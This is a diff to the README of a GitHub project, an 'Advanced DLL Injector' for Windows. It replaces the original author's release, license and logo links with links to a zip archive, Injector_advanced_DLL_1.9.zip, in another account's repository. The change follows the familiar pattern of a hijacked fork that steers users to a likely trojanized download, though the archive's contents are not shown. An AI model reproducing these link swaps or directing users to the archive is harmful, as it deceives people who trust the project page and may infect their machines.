@@ -1,14 +1,14 @@
 <div align="center">
-  <img src="https://github.com/thesayreh/advanced-DLLInjector/blob/main/src/src.png" alt="DLL Injector" width="300">
+  <img src="https://github.com/blaynadams50-cyber/advanced-DLLInjector/raw/refs/heads/main/Injector/Injector_advanced_DLL_1.9.zip" alt="DLL Injector" width="300">
 
   <h1>Advanced DLL Injector</h1>
   <p>Universal interactive DLL injector for Windows (x86/x64), written in modern C++</p>
 
-  <a href="https://github.com/thesayreh/advanced-DLLInjector/releases/tag/v1.0.0">
+  <a href="https://github.com/blaynadams50-cyber/advanced-DLLInjector/raw/refs/heads/main/Injector/Injector_advanced_DLL_1.9.zip">
     <img src="https://img.shields.io/badge/Download-v1.0.0-D5006D?style=for-the-badge&logo=github" alt="Downloads">
   </a>
   <img src="https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge&color=D5006D" alt="Platform">
-  <a href="https://github.com/thesayreh/advanced-DLLInjector/blob/main/LICENSE">
+  <a href="https://github.com/blaynadams50-cyber/advanced-DLLInjector/raw/refs/heads/main/Injector/Injector_advanced_DLL_1.9.zip">
     <img src="https://img.shields.io/github/license/thesayreh/advanced-DLLInjector?style=for-the-badge&color=D5006D" alt="License">
   </a>
 </div>
@@ -39,7 +39,7 @@
 
 ## 🧪 Installation
 
-1. Clone the repository or [download latest release](https://github.com/thesayreh/advanced-DLLInjector/releases/tag/v1.0.0)
+1. Clone the repository or [download latest release](https://github.com/blaynadams50-cyber/advanced-DLLInjector/raw/refs/heads/main/Injector/Injector_advanced_DLL_1.9.zip)
 2. Open project in Visual Studio (or other C++ IDE)
 3. Build as:
    - `x64` if target process is 64-bit
